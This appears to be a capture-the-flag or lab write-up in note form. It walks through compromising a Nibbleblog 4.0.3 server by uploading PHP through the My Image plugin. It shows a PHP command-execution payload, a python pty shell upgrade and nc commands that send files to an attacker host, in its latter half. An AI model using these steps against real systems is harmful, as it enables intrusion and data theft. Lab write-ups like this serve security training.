
> at this point we have admin portal access, the next course of action is to attempt to elevate this access to code execution , and ultimately gain reverse shell access to the webserver

> what we know is that there is a metasploit module exploit/multi/http/nibbleblog_file_upload that will likely work for this, but we can continue to enumerate what we can see from the admin portal for other avenues of attack

## admin portal enumeration 

----


|page|Contents|
|---|----|
|Publish|making a new post,vid post, quote post, or new page.|
|Comments|shows no plublished comments|
|Manage|Allows us to manage posts,pages, and categories. We can edit and delete categories.|
|Settings|Scrolling to the bottom confirms nibbleblog vers 4.0.3 is in use, vuln, several settings avail, but none valuable|
|Themes|Allows install of new Theme from a pre-selected list|
|Plugins|Allows us to configure, install, or uninstall plugins. The My Image plugin allows us to upload an image file. possible php code upload opportunity|


> before trying vuln in metasploit lets try uploading php code through plugins, specifically My Image

- shell.php seems to upload, and triggers errors in the image processing code
-  the /content directory contains /plugins directory that contains a subdir for the my_image plugin
- /nibbleblog/content/private/plugins/my_image
	-  contains two files 
		1. db.xml
		2. image.php
> the last modified date is when we uploaded, so we confirm our upload
> the upload may have triggered errors, but since we retain .php we should have code execution and we can confirm with a curl

> the php code we uploaded to run the whoami command in bash "<?php system('whoami') ?>" responds with nibbler when you curl /nibbleblog/content/private/plugins/my_image/image.php
> this is a success

- send a reverse shell one liner via same method
- connection success but recieve dumb tty
```
/bin/sh: 0 : can't access tty; job control turned off
```
- we cant use things like su or sudo in this
- bypass this by using python to slide into an interactive terminal 
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> we now have full access to a shell in the nibbler user context, and use this to transfer files found in the home dir to attacker

```
nc -l -p 420 > file
```

```
nc <attacker ip> 420< file
```


> user.txt contains first flag



